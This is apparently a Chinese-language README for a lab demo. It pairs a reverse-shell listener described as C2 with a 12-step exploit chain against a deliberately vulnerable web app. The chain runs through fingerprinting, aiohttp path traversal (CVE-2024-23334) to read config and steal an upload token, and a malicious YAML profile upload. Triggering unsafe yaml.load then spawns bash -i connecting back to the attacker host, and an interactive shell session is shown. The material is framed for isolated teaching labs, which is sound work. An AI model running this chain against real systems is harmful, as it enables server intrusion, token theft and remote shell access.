# demo_attacker — 实验演示 C2 监听器

> **仅用于实验环境。** 这是用于演示反弹 shell 的受控接收端。
> 它不转发命令、不转发会话、也不接受任何远程输入。
> 仅可部署在隔离的实验网络中。

## 快速开始（demo-attacker）

```bash

# 在终端中手动运行——保持开启以等待反弹 shell 连入
python3 listener.py
```

---

## 攻击演练 — 12 步 CVE 利用链

> **仅用于实验演示。** 所有脚本均针对受控的实验虚拟机。

### 前置条件

- demo-server 运行 support-portal（`TARGET=$VICTIM_IP:8080`）
- demo-attacker 运行 `demo_attacker/listener.py`
- Python 3.10+、curl、（可选）nmap

先导出两台机器的 IP，后续命令即可直接复制粘贴：

```bash
export VICTIM_IP=<demo-server-ip>     # 例如 192.168.56.10
export ATTACKER_IP=<demo-attacker-ip> # 例如 192.168.56.20
```

### 步骤

#### 0. 准备载荷文件

```bash
cd demo_attacker/attack/

# 生成 evil-profile.yaml（反弹 shell 载荷）
./generate-evil-profile.sh $ATTACKER_IP 4444
```

> `benign-bundle.zip`（触发文件）已提交到 `attack/` 目录中。
> 它的内容与漏洞利用无关——载荷在服务器调用
> `yaml.load(active.yaml)` 时即被执行，此时 zip 文件甚至尚未被打开。

#### 1–2. 指纹识别

```bash
TARGET=$VICTIM_IP:8080 ./01-fingerprint.sh
```

查找 `Server: Python/3.10 aiohttp/3.9.1`——确认存在漏洞的版本。

#### 3–4. 目录遍历 → 读取配置（CVE-2024-23334）

```bash
TARGET=$VICTIM_IP:8080 ./02-traversal-config.sh
```

通过路径遍历读取 `app_config.yaml`。使用 `--path-as-is` 以阻止 curl
规范化 `../` 序列。注意 `internal_routes.diagnostic_profile_upload`
路径以及 `secrets.profile_upload_token_file` 路径。

示例 URL：`http://target:8080/static/x/../../config/app_config.yaml`

注意：curl 默认会规范化 `../`。使用 `--path-as-is` 将字面路径
发送给服务器。在 `../` 之前加一个占位路径段（`x/`）可确保 curl
不会将遍历序列完全剥离。

#### 5.（离线）解析配置以找到令牌文件路径

从配置中得到：`data/secrets/profile-upload-token`

#### 6. 目录遍历 → 窃取令牌

```bash
TARGET=$VICTIM_IP:8080 ./03-traversal-token.sh
```

输出：`demo-profile-admin-token-2026`

#### 7–8. 上传恶意 profile（使用窃取的令牌）

```bash
TARGET=$VICTIM_IP:8080 TOKEN=demo-profile-admin-token-2026 ./04-upload-evil-profile.sh
```

这会以恶意 YAML 调用 `/internal/admin/profile/upload`，
从而覆盖 demo-server 上的 `active.yaml`。

#### 9–11. 触发 yaml.load → 反弹 shell

```bash
TARGET=$VICTIM_IP:8080 ./05-trigger.sh
```

demo-server 的 `DiagnosticEngine` 调用 `yaml.load(active.yaml, Loader=yaml.Loader)`。
PyYAML 反序列化 `!!python/object/apply` → 派生 `bash -i` → 回连
到 demo-attacker 的 `4444` 端口。

#### 12. 在 C2 上交互

在运行 `demo_attacker/listener.py` 的终端中：

```text
[demo-c2] Connection received.
$ id
uid=999(support-portal) gid=999(support-portal) ...
$ whoami
support-portal
```
